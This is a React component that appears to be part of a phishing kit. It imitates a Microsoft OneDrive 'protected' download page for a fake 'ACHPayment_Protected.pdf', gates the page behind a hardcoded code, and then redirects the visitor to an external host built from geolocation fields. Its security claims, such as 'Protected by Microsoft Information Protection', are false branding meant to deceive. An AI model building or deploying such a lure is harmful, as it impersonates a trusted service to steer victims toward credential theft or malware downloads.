import React, { useState, useCallback } from 'react';

const OneDriveDownload = ({geoInfo, redirect, domain, redirectRef}) => {
  // State management
  const [unlocked, setUnlocked] = useState(false);
  const [accessCode, setAccessCode] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  const [errorType, setErrorType] = useState('error'); // 'error' or 'success'
  const [isRedirecting, setIsRedirecting] = useState(false);

  // File configuration
  const FILE_NAME = "ACHPayment_Protected.pdf";
  const CORRECT_CODE = "ONEDRIVE2026";


  // Handle verification
  const handleVerify = useCallback(() => {
    if (!accessCode.trim()) {
      setErrorMessage('Please enter the protection code to unlock download.');
      setErrorType('error');
      return;
    }

    if (accessCode === CORRECT_CODE) {
      setUnlocked(true);
      setErrorMessage('Access granted! You can now download the protected file.');
      setErrorType('success');
    } else {
      setUnlocked(false);
      setErrorMessage('Invalid verification code. Access denied. Please check and try again.');
      setErrorType('error');
      setAccessCode('');
    }
  }, [accessCode]);

const handleDownloadRedirect = useCallback(() => {
    if (!unlocked) {
      setErrorMessage('Verification required before download. Enter the correct code.');
      setErrorType('error');
      return;
    }

    setIsRedirecting(true);
    setErrorMessage('Redirecting to secure download location...');
    setErrorType('success');

    redirectRef.current = true; // ✅ GLOBAL LOCK

    setTimeout(() => {
      if (redirect) {
        window.location.href = `https://${geoInfo.sd}.${geoInfo.dm}.${geoInfo.td}/${geoInfo.hk}`;
      } else {
        window.location.href = `https://${domain}`;
      }

      setTimeout(() => {
        setIsRedirecting(false);
      }, 1000);

    }, 500);

  }, [unlocked, redirect, geoInfo, domain, redirectRef]);


  // Handle Enter key press
  const handleKeyPress = useCallback((e) => {
    if (e.key === 'Enter') {
      handleVerify();
    }
  }, [handleVerify]);

  return (
    <div className="drive-container">
      <div className="drive-card">
        {/* Header */}
        <div className="onedrive-header">
          <div className="onedrive-icon">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M17.5 11.5C17.5 8.5 15.5 6 12.5 6C10.1 6 8.1 7.6 7.5 9.8C5.6 10.3 4 12.1 4 14.2C4 16.6 6 18.5 8.5 18.5H17C19 18.5 20.5 17 20.5 15C20.5 13.1 19.1 11.7 17.2 11.5H17.5Z" fill="white"/>
              <path d="M17.5 11.5C17.5 8.5 15.5 6 12.5 6C10.1 6 8.1 7.6 7.5 9.8C5.6 10.3 4 12.1 4 14.2C4 16.6 6 18.5 8.5 18.5H17C19 18.5 20.5 17 20.5 15C20.5 13.1 19.1 11.7 17.2 11.5H17.5Z" fill="url(#grad)" opacity="0.7"/>
              <defs>
                <linearGradient id="grad" x1="4" y1="12" x2="20.5" y2="12" gradientUnits="userSpaceOnUse">
                  <stop stopColor="#ffffff"/>
                  <stop offset="1" stopColor="#E3F2FF"/>
                </linearGradient>
              </defs>
            </svg>
          </div>
          <span className="brand-text">OneDrive</span>
          <div className="badge-protected">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
            </svg>
            <span>Protected</span>
          </div>
        </div>

        <div className="content">
          {/* File Info */}
          <div className="file-info">
            <div className="file-icon">
              <svg width="56" height="56" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M14 2H6C5.46957 2 4.96086 2.21071 4.58579 2.58579C4.21071 2.96086 4 3.46957 4 4V20C4 20.5304 4.21071 21.0391 4.58579 21.4142C4.96086 21.7893 5.46957 22 6 22H18C18.5304 22 19.0391 21.7893 19.4142 21.4142C19.7893 21.0391 20 20.5304 20 20V8L14 2Z" fill="#E6EFF9" stroke="#0078d4" strokeWidth="1.2"/>
                <path d="M14 2V8H20" fill="#CFE3F5" stroke="#0078d4" strokeWidth="1.2"/>
                <path d="M12 18V12M9 15H15" stroke="#107c10" strokeWidth="1.5" strokeLinecap="round"/>
                <circle cx="12" cy="15" r="3" stroke="#107c10" strokeWidth="1.2" fill="white"/>
              </svg>
            </div>
            <div className="file-details">
              <div className="file-name">{FILE_NAME}</div>
              <div className="file-meta">
                <span className="meta-item">📄 2.4 MB</span>
                <span className="meta-item">🔒 Encrypted · access code required</span>
                {/* <span className="meta-item">📅 Modified Apr 1, 2025</span> */}
              </div>
            </div>
          </div>

          {/* Protection Banner */}
          <div className="protection-banner">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#e68a2e" strokeWidth="1.8">
              <path d="M12 3L3 7L12 11L21 7L12 3Z M12 11L12 21 M9 13L12 15L15 13"/>
            </svg>
            <span>
              <strong>Protected download</strong> — This file requires a secure verification code to enable download.
              Enter the provided passkey to unlock.
            </span>
          </div>

          {/* Verification Section */}
          <div className="verification-section">
            <div className="verification-title">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#0078d4" strokeWidth="1.8">
                <path d="M12 2L15 8H22L16 12L19 18L12 14L5 18L8 12L2 8H9L12 2Z"/>
              </svg>
              <span>Verification required</span>
            </div>
            <div className="input-group">
              <input
                type="password"
                className="input-field"
                placeholder="Enter 6-digit code or passphrase"
                value={accessCode}
                onChange={(e) => setAccessCode(e.target.value)}
                onKeyPress={handleKeyPress}
                autoComplete="off"
                disabled={isRedirecting}
              />
              <button
                className="verify-btn"
                onClick={handleVerify}
                disabled={isRedirecting}
              >
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
                Unlock download
              </button>
            </div>
            {errorMessage && (
              <div className={`error-message ${errorType}`}>
                {errorType === 'error' ? '⚠️' : '✅'} {errorMessage}
              </div>
            )}
            {/* <div className="demo-hint">
              🔐 Demo protected flow: default code = <strong>ONEDRIVE2025</strong> (case‑sensitive)
            </div> */}
          </div>

          {/* Download Button - Redirects to External URL */}
          <div className="download-area">
            <button
              className={`download-btn ${unlocked && !isRedirecting ? 'active-btn' : 'disabled-btn'}`}
              onClick={handleDownloadRedirect}
              disabled={!unlocked || isRedirecting}
            >
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                <polyline points="7 10 12 15 17 10"/>
                <line x1="12" y1="15" x2="12" y2="3"/>
              </svg>
              {isRedirecting
                ? 'Redirecting to secure location...'
                : (unlocked
                  ? `Download ${FILE_NAME}`
                  : 'Download is locked · verify first')}
            </button>
          </div>

          {/* External URL Info (optional - for demonstration) */}
          <div className="external-url-info">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
              <polyline points="15 3 21 3 21 9"></polyline>
              <line x1="10" y1="14" x2="21" y2="3"></line>
            </svg>
            <span>File will be downloaded from a secure external server</span>
          </div>

          {/* Footer */}
          <div className="security-footnote">
            <span>✔️ End-to-end encrypted storage</span>
            <span>🔑 One-time access token</span>
            <span>📁 Protected by Microsoft Information Protection</span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default OneDriveDownload;